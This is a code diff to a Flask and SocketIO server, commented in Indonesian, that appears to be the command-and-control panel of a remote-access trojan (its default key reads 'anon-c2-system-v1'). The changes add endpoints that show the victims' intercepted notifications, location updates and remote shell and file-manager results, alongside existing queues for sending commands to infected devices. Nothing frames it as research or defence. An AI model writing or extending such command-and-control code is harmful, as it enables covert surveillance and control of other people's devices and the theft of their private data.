@@ -16,10 +16,10 @@ app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'anon-c2-system-v1')
 # SocketIO tanpa worker tambahan
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode=None)
 
-# --- Konfigurasi ---
-FLASK_PORT = int(os.environ.get('PORT', 9191))
-SERVER1_URL = os.environ.get('SERVER1_URL', 'http://localhost:9090')
+# --- Konfigurasi dari Environment Variable ---
+FLASK_PORT = int(os.environ.get('PORT', 9191))  # Railway akan set PORT
 DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true'
+SERVER1_URL = os.environ.get('SERVER1_URL', '')  # Optional: untuk kirim command balik ke server1
 
 # --- Global Variables ---
 connected_devices = {}
@@ -39,6 +39,17 @@ for dir_name in ['web_downloads', 'web_images', 'web_recordings']:
     if not os.path.exists(dir_name):
         os.makedirs(dir_name)
 
+# --- Info Startup ---
+logger.info("=" * 50)
+logger.info("SERVER2 STARTING UP")
+logger.info(f"Port: {FLASK_PORT}")
+logger.info(f"Debug: {DEBUG}")
+if SERVER1_URL:
+    logger.info(f"Server1 URL: {SERVER1_URL}")
+else:
+    logger.info("Server1 URL: Not configured")
+logger.info("=" * 50)
+
 # ==================== ROUTES ====================
 
 @app.route('/')
@@ -52,7 +63,8 @@ def health():
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.now().isoformat(),
-        'devices_connected': len(connected_devices)
+        'devices_connected': len(connected_devices),
+        'server1_url': SERVER1_URL or 'not configured'
     })
 
 @app.route('/api/devices')
@@ -178,6 +190,10 @@ def receive_data():
             socketio.emit('new_notification', payload.get('notification', {}))
         elif data_type == 'IMAGE_DATA':
             save_image_for_web(payload.get('image', {}), device_id)
+        elif data_type == 'CONNECTION':
+            socketio.emit('connection_status', payload)
+        elif data_type == 'LOCATION_SUCCESS':
+            socketio.emit('location_update', {'url': payload.get('url')})
         
         return jsonify({'status': 'ok'})
         
@@ -232,6 +248,22 @@ def get_apps():
     
     return jsonify(apps)
 
+@app.route('/api/notifications')
+def get_notifications():
+    """Mendapatkan notifications"""
+    if not current_device:
+        return jsonify([])
+    
+    notifs = []
+    if current_device in device_data_queues:
+        for item in reversed(device_data_queues[current_device]):
+            if item['type'] == 'NOTIFICATION_DATA':
+                notifs.append(item['payload'].get('notification', {}))
+                if len(notifs) >= 50:
+                    break
+    
+    return jsonify(notifs)
+
 @app.route('/api/image/<filename>')
 def get_image(filename):
     """Mengambil image yang sudah disimpan"""
@@ -239,6 +271,22 @@ def get_image(filename):
         return send_file(os.path.join('web_images', filename))
     except:
         return jsonify({'error': 'Image not found'}), 404
+
+@app.route('/api/shell_results')
+def get_shell_results():
+    """Mendapatkan hasil shell command"""
+    if not current_device:
+        return jsonify([])
+    
+    results = []
+    if current_device in device_data_queues:
+        for item in reversed(device_data_queues[current_device]):
+            if item['type'] in ['SHELL_LS_RESULT', 'FILE_MANAGER_RESULT', 'SHELL_CD_SUCCESS']:
+                results.append(item['payload'])
+                if len(results) >= 20:
+                    break
+    
+    return jsonify(results)
 
 # ==================== Helper Functions ====================
 
@@ -294,7 +342,7 @@ def save_image_for_web(image_data, device_id):
 @socketio.on('connect')
 def handle_connect():
     logger.info(f"Web client connected: {request.sid}")
-    emit('connected', {'status': 'ok'})
+    emit('connected', {'status': 'ok', 'timestamp': datetime.now().isoformat()})
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -320,6 +368,7 @@ def handle_select_device(data):
     if device_id in connected_devices:
         current_device = device_id
         emit('device_selected', connected_devices[device_id])
+        logger.info(f"Device selected via socket: {device_id}")
 
 @socketio.on('web_command')
 def handle_web_command(data):
@@ -333,10 +382,11 @@ def handle_web_command(data):
     cmd_str = format_command(cmd, params)
     command_queue.put({
         'device_id': current_device,
-        'command': cmd_str
+        'command': cmd_str,
+        'timestamp': datetime.now().isoformat()
     })
     
-    emit('command_sent', {'command': cmd_str})
+    emit('command_sent', {'command': cmd_str, 'timestamp': datetime.now().isoformat()})
 
 # ==================== Background Thread ====================
 
@@ -347,7 +397,9 @@ def command_processor():
             if not command_queue.empty():
                 cmd_data = command_queue.get()
                 logger.info(f"Processing command: {cmd_data}")
-                # TODO: Implement send to server1
+                # TODO: Implement send to server1 if needed
+                # if SERVER1_URL:
+                #     requests.post(f"{SERVER1_URL}/command", json=cmd_data)
         except Exception as e:
             logger.error(f"Command processor error: {e}")
         threading.Event().wait(0.1)
@@ -359,5 +411,4 @@ threading.Thread(target=command_processor, daemon=True).start()
 
 if __name__ == '__main__':
     logger.info(f"Starting Flask server on port {FLASK_PORT}")
-    logger.info(f"Debug mode: {DEBUG}")
     socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=DEBUG)
